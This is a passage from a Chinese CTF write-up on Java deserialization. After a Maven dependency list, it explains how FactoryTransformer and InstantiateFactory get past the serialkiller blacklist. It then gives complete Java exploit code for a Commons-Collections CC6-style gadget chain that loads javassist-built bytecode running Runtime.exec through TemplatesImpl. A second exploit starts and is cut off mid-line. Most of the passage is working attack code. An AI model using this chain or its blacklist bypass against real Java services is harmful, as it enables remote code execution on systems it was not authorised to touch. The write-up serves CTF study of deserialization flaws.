</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;artifactId&gt;</span>commons-collections<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;version&gt;</span>3.2.1<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">&lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;groupId&gt;</span>commons-logging<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;artifactId&gt;</span>commons-logging<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;version&gt;</span>1.1.1<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">&lt;!-- https://mvnrepository.com/artifact/commons-lang/commons-lang --&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;groupId&gt;</span>commons-lang<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;artifactId&gt;</span>commons-lang<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;version&gt;</span>2.6<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;groupId&gt;</span>org.apache.commons<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;artifactId&gt;</span>commons-collections4<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;version&gt;</span>4.4<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;groupId&gt;</span>org.nibblesec<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;artifactId&gt;</span>serialkiller<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;version&gt;</span>0.4<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/dependencies&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;build&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;plugins&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;plugin&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;groupId&gt;</span>org.springframework.boot<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;artifactId&gt;</span>spring-boot-maven-plugin<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/plugin&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/plugins&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/build&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/project&gt;</span>
</span></span></code></pre></div><p>配合FactoryTransformer和InstantiateFactory可以达到InstantiateTransformer一样的效果，从而绕过黑名单。其他地方和上题大同小异。另外，虽然黑名单有Transformer，但是serialkiller其实是通过重写ObjectInputStream#resolveClass方法获取了类名，是完整的包名，所以仅仅是继承一个Transformer接口的类也是可以反序列化的</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> com.example.easyjava.solve<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.CannotCompileException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.ClassClassPath<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.ClassPool<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.CtClass<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.Transformer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.functors.*<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.map.LazyMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.map.TransformedMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.map.DefaultedMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.xml.transform.Templates<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ByteArrayInputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ByteArrayOutputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ObjectInputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ObjectOutputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Field<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashSet<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Map<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">CC6</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        TemplatesImpl templatesImpl<span style="color:#ff79c6">=</span>getTemplates<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">/*
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         * DefaultedMap(outerMap).value.transform(tiedMapEntry.key)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         *
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         * */</span>
</span></span><span style="display:flex;"><span>        InstantiateFactory factory <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> InstantiateFactory<span style="color:#ff79c6">(</span>
</span></span><span style="display:flex;"><span>                TrAXFilter<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">new</span> Class<span style="color:#ff79c6">[]{</span>
</span></span><span style="display:flex;"><span>                        Templates<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">},</span><span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]{</span>
</span></span><span style="display:flex;"><span>                templatesImpl
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        FactoryTransformer chainedTransformer <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> FactoryTransformer<span style="color:#ff79c6">(</span>factory<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Map innerMap <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        Map outerMap <span style="color:#ff79c6">=</span> DefaultedMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">decorate</span><span style="color:#ff79c6">(</span>innerMap<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> ConstantTransformer<span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        TiedMapEntry tiedMapEntry <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> TiedMapEntry<span style="color:#ff79c6">(</span>outerMap<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;keykey&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Map expMap <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        expMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>tiedMapEntry<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;valuevalue&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        outerMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">remove</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;keykey&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>outerMap<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;value&#34;</span><span style="color:#ff79c6">,</span> chainedTransformer<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> b<span style="color:#ff79c6">=</span>serialize<span style="color:#ff79c6">(</span>expMap<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        deserialize<span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#50fa7b">CC6</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> <span style="color:#50fa7b">serialize</span><span style="color:#ff79c6">(</span>Object o<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            ByteArrayOutputStream aos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayOutputStream<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            ObjectOutputStream oos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectOutputStream<span style="color:#ff79c6">(</span>aos<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeObject</span><span style="color:#ff79c6">(</span>o<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">flush</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> aos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toByteArray</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>Object obj<span style="color:#ff79c6">,</span> String name<span style="color:#ff79c6">,</span> Object value<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> NoSuchFieldException<span style="color:#ff79c6">,</span> IllegalAccessException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        Field fieldName <span style="color:#ff79c6">=</span> obj<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span>name<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        fieldName<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        fieldName<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">,</span> value<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">deserialize</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> bytes<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            ByteArrayInputStream ais <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayInputStream<span style="color:#ff79c6">(</span>bytes<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            ObjectInputStream ois <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectInputStream<span style="color:#ff79c6">(</span>ais<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">static</span> TemplatesImpl <span style="color:#50fa7b">getTemplates</span><span style="color:#ff79c6">()</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        ClassPool classPool <span style="color:#ff79c6">=</span> ClassPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDefault</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        classPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">insertClassPath</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> ClassClassPath<span style="color:#ff79c6">(</span>AbstractTranslet<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>        CtClass ctClass <span style="color:#ff79c6">=</span> classPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">makeClass</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Evil&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        ctClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setSuperclass</span><span style="color:#ff79c6">(</span>classPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>AbstractTranslet<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">()));</span>
</span></span><span style="display:flex;"><span>        String shell <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        ctClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">makeClassInitializer</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">insertBefore</span><span style="color:#ff79c6">(</span>shell<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> shellCode <span style="color:#ff79c6">=</span> ctClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toBytecode</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[][]</span> targetByteCode <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[][]{</span>shellCode<span style="color:#ff79c6">};</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        TemplatesImpl templates <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> TemplatesImpl<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        Class c1 <span style="color:#ff79c6">=</span> templates<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        Field _name <span style="color:#ff79c6">=</span> c1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;_name&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Field _bytecode <span style="color:#ff79c6">=</span> c1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;_bytecodes&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Field _tfactory <span style="color:#ff79c6">=</span> c1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;_tfactory&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        _name<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        _bytecode<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        _tfactory<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        _name<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;h3rmesk1t&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        _bytecode<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> targetByteCode<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        _tfactory<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> TransformerFactoryImpl<span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> templates<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>郭哥的exp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> CC6<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.ClassPool<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.Transformer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.functors.ConstantTransformer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.functors.FactoryTransformer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.functors.InstantiateFactory<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.map.DefaultedMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.xml.transform.Templates<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ByteArrayInputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ByteArrayOutputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ObjectInputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ObjectOutputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Field<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Base64<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Map<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">test2</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>Object obj<span style="color:#ff79c6">,</span> String fieldName<span style="color:#ff79c6">,</span> Object value<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span>
</span></span><span style="display:flex;"><span>Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>Field field <span style="color:#ff79c6">=</span> obj<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span>fieldName<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>field<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>field<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">,</span> value<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>TemplatesImpl templates <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> TemplatesImpl<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_bytecodes&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[][]</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>ClassPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDefault</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>com<span style="color:#ff79c6">.</span><span style="color:#50fa7b">springboot</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">springbootdemo</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">exp</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">()).</span><span style="color:#50fa7b">toBytecod</span>
</span></span><span style="display:flex;"><span>e<span style="color:#ff79c6">()});</span>
